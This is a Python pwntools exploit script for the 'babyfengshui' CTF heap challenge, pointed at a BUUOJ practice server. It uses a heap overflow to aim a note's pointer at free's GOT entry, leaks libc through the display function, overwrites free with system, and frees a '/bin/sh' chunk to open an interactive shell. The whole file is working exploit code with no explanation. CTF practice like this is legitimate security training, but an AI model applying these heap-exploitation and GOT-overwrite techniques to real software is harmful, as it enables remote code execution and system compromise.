from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
elf = ELF('./babyfengshui_33c3_2016')
sh = elf.process()
sh = remote('node3.buuoj.cn', 28263)

def add(sizeofde, name, tlen, text):
	sh.recvuntil("Action: ")
	sh.sendline('0')
	sh.recvuntil("size of description: ")
	sh.sendline(str(sizeofde))
	sh.recvuntil("name: ")
	sh.sendline(name)
	sh.recvuntil("text length: ")
	sh.sendline(str(tlen))
	sh.recvuntil("text: ")
	sh.sendline(text)

def dele(index):
	sh.recvuntil("Action: ")
	sh.sendline('1')
	sh.recvuntil("index: ")
	sh.sendline(str(index))

def dis(index):
	sh.recvuntil("Action: ")
	sh.sendline('2')
	sh.recvuntil("index: ")
	sh.sendline(str(index))

def upd(index, tlen, text):
	sh.recvuntil("Action: ")
	sh.sendline('3')
	sh.recvuntil("index: ")
	sh.sendline(str(index))
	sh.recvuntil("text length: ")
	sh.sendline(str(tlen))
	sh.recvuntil("text: ")
	sh.sendline(text)

add(0x80, 'logan', 0x80, 'AAAA')
add(0x80, 'logan', 0x80, 'BBBB')
add(0x8, '\n', 0x8, "/bin/sh")
dele(0)

add(0x100, '00', 0x19C, 'C' * 0x198 + p32(elf.got['free']))

#display
dis(1)
sh.recvuntil('\x3a\x20')
sh.recvuntil('\x3a\x20')
libc_free = u32(sh.recvline()[0:4])
print 'free->elf.got_addr ->' + hex(elf.got['free'])
print 'libc_free-> :' + hex(libc_free)
libc = LibcSearcher('free', libc_free)
libc_base = libc_free - libc.dump('free')
libc_sys = libc_base + libc.dump('system')
print 'libc_base-> :' + hex(libc_base)
print 'libc_sys-> :' + hex(libc_sys)

upd(1, 0xC, p32(libc_sys) + '00000000')

#gdb.attach(sh)

dele(2)

sh.interactive()
